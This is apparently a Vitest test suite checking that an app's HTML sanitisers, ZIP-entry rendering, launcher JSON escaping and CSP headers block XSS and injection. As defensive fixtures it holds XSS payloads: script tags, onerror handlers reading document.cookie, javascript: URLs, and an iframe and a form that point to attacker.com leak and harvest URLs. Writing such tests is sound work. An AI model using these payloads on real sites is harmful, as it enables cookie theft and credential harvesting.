/**
 * @vitest-environment jsdom
 */
import { describe, it, expect } from 'vitest';
import JSZip from 'jszip';
import { sanitizeHtml } from '../src/utils/sanitizeHtml';
import { sanitizeHtml as serverSanitizeHtml } from '../server/sanitizeHtml';
import { buildInteractiveProtectedHtmlLauncher } from '../server/launcherTemplate';
import { buildSecureViewerPayload } from '../server/crypto';
import { createExpressApp } from '../server';

describe('Task 3 — XSS & Injection Prevention', () => {
  describe('1. Strict DOMPurify Sanitization', () => {
    it('strips <script> tags and executable script payloads completely', () => {
      const dirty = '<p>Document Text <script>alert("XSS_ATTACK")</script> Continues</p>';
      const cleanClient = sanitizeHtml(dirty);
      const cleanServer = serverSanitizeHtml(dirty);

      expect(cleanClient).not.toContain('<script');
      expect(cleanClient).not.toContain('alert(');
      expect(cleanClient).toBe('<p>Document Text  Continues</p>');

      expect(cleanServer).not.toContain('<script');
      expect(cleanServer).not.toContain('alert(');
      expect(cleanServer).toBe('<p>Document Text  Continues</p>');
    });

    it('strips onerror and all on* inline event handler attributes', () => {
      const dirty = '<img src="invalid_image.png" onerror="alert(document.cookie)" alt="doc image">';
      const clean = sanitizeHtml(dirty);

      expect(clean).not.toContain('onerror');
      expect(clean).not.toContain('alert(');
      expect(clean).toContain('<img');
      expect(clean).toContain('src="invalid_image.png"');
      expect(clean).toContain('alt="doc image"');
    });

    it('strips javascript: pseudo-protocol URLs in hyperlinks', () => {
      const dirty = '<a href="javascript:alert(\'pwned\')">Download Document</a>';
      const clean = sanitizeHtml(dirty);

      expect(clean).not.toContain('javascript:');
      expect(clean).not.toContain('alert');
      // The dangerous href attribute is stripped
      expect(clean).not.toContain('href=');
    });

    it('strips non-image data: URLs (e.g. data:text/html)', () => {
      const dirty = '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>';
      const clean = sanitizeHtml(dirty);

      expect(clean).not.toContain('data:text/html');
      expect(clean).not.toContain('PHNjcmlwdD');
    });

    it('strips style, iframe, object, embed, and form tags', () => {
      const dirty = `
        <style>body { display: none; }</style>
        <iframe src="https://attacker.com/leak"></iframe>
        <object data="malicious.swf"></object>
        <embed src="malicious.pdf">
        <form action="https://attacker.com/harvest"><input name="pwd"></form>
        <div style="background: url(javascript:alert(1));" onclick="alert(2)">Safe Div</div>
      `;
      const clean = sanitizeHtml(dirty);

      expect(clean).not.toContain('<style');
      expect(clean).not.toContain('<iframe');
      expect(clean).not.toContain('<object');
      expect(clean).not.toContain('<embed');
      expect(clean).not.toContain('<form');
      expect(clean).not.toContain('onclick');
      expect(clean).not.toContain('style=');
      expect(clean).toContain('Safe Div');
    });

    it('permits safe rich text formatting, tables, and safe images', () => {
      const safe = `
        <h1 class="title">تقرير الحسابات السنوي</h1>
        <p>فقرة تحتوي على <strong>نص عريض</strong> و <em>نص مائل</em>.</p>
        <table dir="rtl">
          <thead><tr><th>البند</th><th>القيمة</th></tr></thead>
          <tbody><tr><td>الإيرادات</td><td>100,000</td></tr></tbody>
        </table>
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" alt="شعار" />
      `;
      const clean = sanitizeHtml(safe);

      expect(clean).toContain('تقرير الحسابات السنوي');
      expect(clean).toContain('<strong>');
      expect(clean).toContain('<table');
      expect(clean).toContain('data:image/png;base64,');
    });
  });

  describe('2. Malicious ZIP Entry Name Handling', () => {
    it('processes a ZIP entry named `"><img src=x onerror=alert(1)>` without executing or injecting HTML', async () => {
      const maliciousZip = new JSZip();
      const maliciousEntryName = '"><img src=x onerror=alert(1)>';
      maliciousZip.file(maliciousEntryName, 'malicious payload content');
      const zipBuffer = await maliciousZip.generateAsync({ type: 'nodebuffer' });

      const dummyRecord: any = {
        fileId: 'zip-xss-test-id',
        originalName: 'test.zip',
        extension: '.zip',
        fileSize: zipBuffer.length,
      };

      const viewerPayload = await buildSecureViewerPayload(zipBuffer, dummyRecord);
      expect(viewerPayload.viewerType).toBe('zip');
      expect(viewerPayload.zipEntries).toBeDefined();
      expect(viewerPayload.zipEntries?.length).toBe(1);
      expect(viewerPayload.zipEntries?.[0].name).toBe(maliciousEntryName);

      // Simulate rendering into the DOM using safe textContent (as in launcherTemplate and React)
      const container = document.createElement('div');
      const ul = document.createElement('ul');
      viewerPayload.zipEntries?.forEach((e) => {
        const li = document.createElement('li');
        li.textContent = `📄 ${e.name} (${Math.round(e.sizeBytes / 1024)} KB)`;
        ul.appendChild(li);
      });
      container.appendChild(ul);

      // Verify no img element was created in the DOM
      const imgElements = container.querySelectorAll('img');
      expect(imgElements.length).toBe(0);

      // The malicious string must be treated purely as literal text
      expect(container.textContent).toContain('"><img src=x onerror=alert(1)>');
      expect(container.innerHTML).not.toContain('<img src=x');
    });
  });

  describe('3. Launcher Template Container Escaping & CSP Verification', () => {
    it('escapes script tags, quotes, and unicode line separators in container JSON', () => {
      const maliciousContainer: Record<string, unknown> = {
        fileId: 'malicious-container-id',
        originalName: '"><script>alert("XSS_BREAKOUT")</script>.docx',
        extension: '.docx',
        payload: '</script><script>alert("INJECTED")</script>',
        unicodeSep: 'Line 1\u2028Line 2\u2029Line 3',
        htmlAmp: 'A < B & C > D',
      };

      const launcherHtml = buildInteractiveProtectedHtmlLauncher(maliciousContainer);

      // 1. Must NOT contain the legacy insecure comment
      expect(launcherHtml).not.toContain('<!--TOOLNOVA_SECURE_CONTAINER_START');
      expect(launcherHtml).not.toContain('TOOLNOVA_SECURE_CONTAINER_END-->');

      // 2. Must contain <script type="application/json" id="toolnova-container">
      expect(launcherHtml).toContain('<script type="application/json" id="toolnova-container">');

      // 3. Must NOT contain raw unescaped </script> inside the JSON script
      const scriptTagMatch = launcherHtml.match(
        /<script type="application\/json" id="toolnova-container">([\s\S]*?)<\/script>/
      );
      expect(scriptTagMatch).not.toBeNull();
      const rawScriptInner = scriptTagMatch![1];
      expect(rawScriptInner).not.toContain('</script>');
      expect(rawScriptInner).not.toContain('<script>');
      expect(rawScriptInner).toContain('\\u003c');
      expect(rawScriptInner).toContain('\\u003e');
      expect(rawScriptInner).toContain('\\u0026');

      // 4. Must successfully parse back to original data via JSON.parse
      const unescapedPayload = JSON.parse(rawScriptInner);
      expect(unescapedPayload.originalName).toBe('"><script>alert("XSS_BREAKOUT")</script>.docx');
      expect(unescapedPayload.payload).toBe('</script><script>alert("INJECTED")</script>');
      expect(unescapedPayload.htmlAmp).toBe('A < B & C > D');
    });

    it('includes a strict CSP meta tag with nonce and origin restrictions', () => {
      const container: Record<string, unknown> = {
        fileId: 'csp-test-id',
        originalName: 'report.docx',
        extension: '.docx',
      };

      const launcherHtml = buildInteractiveProtectedHtmlLauncher(container);

      // Verify Content-Security-Policy meta tag
      expect(launcherHtml).toMatch(/<meta http-equiv="Content-Security-Policy" content="[^"]+"/);
      expect(launcherHtml).toContain("default-src 'none'");
      expect(launcherHtml).toContain("script-src 'nonce-");
      expect(launcherHtml).toContain("style-src 'unsafe-inline'");
      expect(launcherHtml).toContain('img-src data: blob:');
      expect(launcherHtml).toContain('connect-src');

      // Verify the launcher's script tag has the matching nonce
      const nonceMatch = launcherHtml.match(/script-src 'nonce-([^']+)'/);
      expect(nonceMatch).not.toBeNull();
      const nonce = nonceMatch![1];
      expect(launcherHtml).toContain(`<script nonce="${nonce}">`);
    });
  });

  describe('4. Server Helmet CSP Header Verification', () => {
    it('sets strict CSP headers when NODE_ENV is production', async () => {
      const prevEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';

      try {
        const app = createExpressApp();
        app.get('/test-helmet-headers', (_req, res) => {
          res.send('ok');
        });

        const server = app.listen(0);
        const address = server.address() as any;
        const port = address.port;

        try {
          const res = await fetch(`http://localhost:${port}/test-helmet-headers`);
          expect(res.status).toBe(200);

          const csp = res.headers.get('content-security-policy');
          expect(csp).toBeTruthy();
          expect(csp).toContain("default-src 'self'");
          expect(csp).toContain("object-src 'none'");
          expect(csp).toContain("base-uri 'none'");
          expect(csp).toContain("frame-ancestors 'self'");
        } finally {
          server.close();
        }
      } finally {
        process.env.NODE_ENV = prevEnv;
      }
    });
  });
});
